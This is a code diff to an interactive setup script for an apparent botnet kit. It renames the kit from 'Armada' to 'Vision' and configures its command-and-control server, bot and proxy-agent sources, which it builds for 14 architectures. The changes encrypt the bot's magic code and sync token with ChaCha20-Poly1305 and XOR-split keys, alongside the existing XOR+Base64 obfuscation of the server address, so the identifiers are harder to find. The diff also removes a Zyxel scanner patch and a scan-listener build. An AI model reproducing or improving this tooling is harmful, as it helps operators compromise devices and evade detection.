@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-Armada - Interactive Setup Script
+Vision - Interactive Setup Script
 =======================================
 Automates the complete setup process:
 - Generates random protocol version and magic code
 - Obfuscates server address using XOR+Base64
-- Configures VPE2 encrypted transport
+- Configures EZF3 encrypted transport
 - Updates CNC and proxy agent source code
 - Builds all components
 
@@ -698,15 +698,41 @@ def update_cnc_main_go(
     proxy_user=None, proxy_pass=None
 ):
     """Update the CNC main.go file with new values"""
+    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305 as CC20
+
     main_go_path = os.path.join(cnc_path, "main.go")
 
     with open(main_go_path, "r") as f:
         content = f.read()
 
-    # Update MAGIC_CODE
+    # --- Encrypt MAGIC_CODE with ChaCha20-Poly1305, XOR-split key ---
+    mc_real_key = os.urandom(32)
+    mc_mask = os.urandom(32)
+    mc_key0 = bytes(k ^ m for k, m in zip(mc_real_key, mc_mask))
+    mc_key1 = mc_mask
+    nonce = os.urandom(12)
+    aead = CC20(mc_real_key)
+    ct = nonce + aead.encrypt(nonce, magic_code.encode(), None)
+    mc_blob_hex = ct.hex()
+
+    def go_byte_array(b: bytes) -> str:
+        """Format bytes as Go [32]byte{0xHH, ...}"""
+        elems = ", ".join(f"0x{x:02x}" for x in b)
+        return f"[32]byte{{{elems}}}"
+
     content = re.sub(
-        r'MAGIC_CODE\s*=\s*"[^"]*"',
-        lambda m: f'MAGIC_CODE       = "{magic_code}"',
+        r'_mcBlob\s*=\s*"[^"]*"',
+        f'_mcBlob = "{mc_blob_hex}"',
+        content,
+    )
+    content = re.sub(
+        r'_mcKey0\s*=\s*\[32\]byte\{[^}]*\}',
+        f'_mcKey0 = {go_byte_array(mc_key0)}',
+        content,
+    )
+    content = re.sub(
+        r'_mcKey1\s*=\s*\[32\]byte\{[^}]*\}',
+        f'_mcKey1 = {go_byte_array(mc_key1)}',
         content,
     )
 
@@ -817,11 +843,7 @@ def update_bot_config(
         lambda m: f'{m.group(1)}"{crypt_seed}"',
         content,
     )
-    content = re.sub(
-        r'(#define SYNC_TOKEN\s+)"[^"]*"',
-        lambda m: f'{m.group(1)}"{magic_code}"',
-        content,
-    )
+    # SYNC_TOKEN is no longer a #define — it's an encrypted blob in config.c
     content = re.sub(
         r'(#define BUILD_TAG\s+)"[^"]*"',
         lambda m: f'{m.group(1)}"{protocol_version}"',
@@ -830,7 +852,7 @@ def update_bot_config(
     with open(hpp_path, "w") as f:
         f.write(content)
 
-    # Update rawServiceAddrs in config.c
+    # Update rawServiceAddrs + encrypted sync token in config.c
     config_cpp_path = os.path.join(bot_path, "config.c")
     with open(config_cpp_path, "r") as f:
         content = f.read()
@@ -841,6 +863,27 @@ def update_bot_config(
         lambda m: f'{m.group(1)}{enc_service_addrs}"',
         content,
     )
+    enc_sync_token = dual_layer_encrypt(magic_code)
+    content = re.sub(
+        r'(static const char\s*\*\s*raw_sync_token\s*=\s*")[^"]*"',
+        lambda m: f'{m.group(1)}{enc_sync_token}"',
+        content,
+    )
+
+    # Keep config-blob sentinels in sync with the #define values updated above
+    enc_config_seed = dual_layer_encrypt(crypt_seed)
+    content = re.sub(
+        r'(static const char\s*\*\s*raw_config_seed\s*=\s*")[^"]*"',
+        lambda m: f'{m.group(1)}{enc_config_seed}"',
+        content,
+    )
+    enc_build_tag = dual_layer_encrypt(protocol_version)
+    content = re.sub(
+        r'(static const char\s*\*\s*raw_build_tag\s*=\s*")[^"]*"',
+        lambda m: f'{m.group(1)}{enc_build_tag}"',
+        content,
+    )
+
     with open(config_cpp_path, "w") as f:
         f.write(content)
 
@@ -910,13 +953,6 @@ def patch_scanner_config(bot_path: str, bins_host: str):
     config_path = os.path.join(bot_path, "config.c")
     with open(config_path, "r") as f:
         content = f.read()
-
-    # Patch zyxel scanner binary name to match tools/build.sh output
-    content = re.sub(
-        r'(#define SCANNER_ZYXEL_BIN\s+)"[^"]*"',
-        lambda m: f'{m.group(1)}"redis-conteinerd"',
-        content,
-    )
 
     with open(config_path, "w") as f:
         f.write(content)
@@ -1088,42 +1124,7 @@ def build_admin_relay(base_path: str) -> bool:
         return False
 
 
-def build_scan_listener(base_path: str) -> bool:
-    """Build the scan listener binary"""
-    try:
-        go = find_go()
-        scan_path = os.path.join(base_path, "scanListen")
-        if not os.path.isdir(scan_path):
-            warning("scanListen/ directory not found, skipping")
-            return False
-        out_dir = os.path.join(base_path, "relay_bins")
-        os.makedirs(out_dir, exist_ok=True)
-        out_bin = os.path.join(out_dir, "scanListen")
-        info(f"Building scan listener... ({go})")
-        result = subprocess.run(
-            [go, "build", "-ldflags=-s -w", "-o", out_bin, "."],
-            cwd=scan_path,
-            env={**os.environ, "GOFLAGS": ""},
-            capture_output=True,
-            text=True,
-        )
-        # Fallback: build from module root with package path
-        if result.returncode != 0:
-            result = subprocess.run(
-                [go, "build", "-ldflags=-s -w", "-o", out_bin, "./scanListen/"],
-                cwd=base_path,
-                env={**os.environ, "GOFLAGS": ""},
-                capture_output=True,
-                text=True,
-            )
-        if result.returncode != 0:
-            error(f"Scan listener build failed: {result.stderr}")
-            return False
-        info(f"Scan listener built -> {out_bin}")
-        return True
-    except FileNotFoundError:
-        error("Go not found. Please install Go 1.24+")
-        return False
+
 
 
 def is_attack_disabled(base_path: str) -> bool:
@@ -1204,7 +1205,7 @@ def save_config(base_path: str, config: dict):
 
     with open(os.open(config_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600), "w") as f:
         f.write("=" * 60 + "\n")
-        f.write("Armada Configuration\n")
+        f.write("Vision Configuration\n")
         f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write("=" * 60 + "\n\n")
 
@@ -1257,10 +1258,6 @@ def save_config(base_path: str, config: dict):
         f.write("4. Login trigger (split mode): spamtec\n")
         f.write("5. Proxy binaries: bins/\n")
         f.write(f"6. Start Relay: ./relay_server -key {config['magic_code']}\n")
-        scan_srv = config.get("scan_server", "")
-        if scan_srv:
-            scan_port = scan_srv.split(":")[-1] if ":" in scan_srv else "48290"
-            f.write(f"7. Start Scan Listener: ./relay_bins/scanListen -p {scan_port}\n")
         f.write("\n")
         f.write("[Modes]\n")
         f.write(
@@ -1337,9 +1334,7 @@ def get_current_config(bot_path: str, cnc_path: str) -> dict:
         with open(bot_hpp, "r") as f:
             content = f.read()
 
-            match = re.search(r'#define\s+SYNC_TOKEN\s+"([^"]*)"', content)
-            if match:
-                config["magic_code"] = match.group(1)
+            # SYNC_TOKEN is now an encrypted blob — read magic_code from setup_config.txt instead
 
             match = re.search(r'#define\s+BUILD_TAG\s+"([^"]*)"', content)
             if match:
@@ -1550,7 +1545,7 @@ def print_menu():
     print(
         f"\n{Colors.DIM}  📡 Supports: Direct IP, Domain (A record), or TXT record resolution{Colors.RESET}"
     )
-    print(f"{Colors.DIM}  🔒 Proxy→Server encrypted via VPE2 (ChaCha20 + X25519 + HMAC) on port 443{Colors.RESET}")
+    print(f"{Colors.DIM}  🔒 Proxy→Server encrypted via EZF3 (ChaCha20 + X25519 + HMAC) on port 443{Colors.RESET}")
     print(
         f"{Colors.DIM}  🏗️  Builds for 14 architectures (x86, ARM, MIPS, etc.){Colors.RESET}\n"
     )
@@ -1680,13 +1675,15 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     old_aes_key = read_current_key_cpp(cpp_crypto_path)
     old_chacha_key = read_current_chacha_key_cpp(cpp_crypto_path)
 
-    # Try to read current magic/protocol/seed from bot.h
+    # Try to read current protocol/seed from bot.h, magic from setup_config.txt
     cur_magic = cur_proto = cur_seed = None
+    # Magic code is no longer a #define — read from setup_config.txt
+    existing_cfg = load_config_file(os.path.dirname(os.path.abspath(__file__)))
+    if "magic_code" in existing_cfg:
+        cur_magic = existing_cfg["magic_code"]
     try:
         with open(bot_h_path, "r") as f:
             bh = f.read()
-        m = re.search(r'#define\s+SYNC_TOKEN\s+"([^"]+)"', bh)
-        if m: cur_magic = m.group(1)
         m = re.search(r'#define\s+BUILD_TAG\s+"([^"]+)"', bh)
         if m: cur_proto = m.group(1)
         m = re.search(r'#define\s+CONFIG_SEED\s+"([^"]+)"', bh)
@@ -1869,12 +1866,6 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
             success("Proxy relay built")
         else:
             warning("Proxy relay build failed - build manually with: cd relay && go build")
-
-    if confirm("Would you like to build the scan listener (receives scanner results)?"):
-        if build_scan_listener(base_path):
-            success("Scan listener built")
-        else:
-            warning("Scan listener build failed - build manually with: cd scanListen && go build")
 
     if confirm(
         "Would you like to build proxy binaries? (14 architectures, takes a few mins)"
@@ -2368,7 +2359,7 @@ def main():
 
     # Verify paths exist
     if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
-        error("Cannot find cnc/ or bot/ directories. Run this from Armada root.")
+        error("Cannot find cnc/ or bot/ directories. Run this from Vision root.")
         sys.exit(1)
 
     print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")
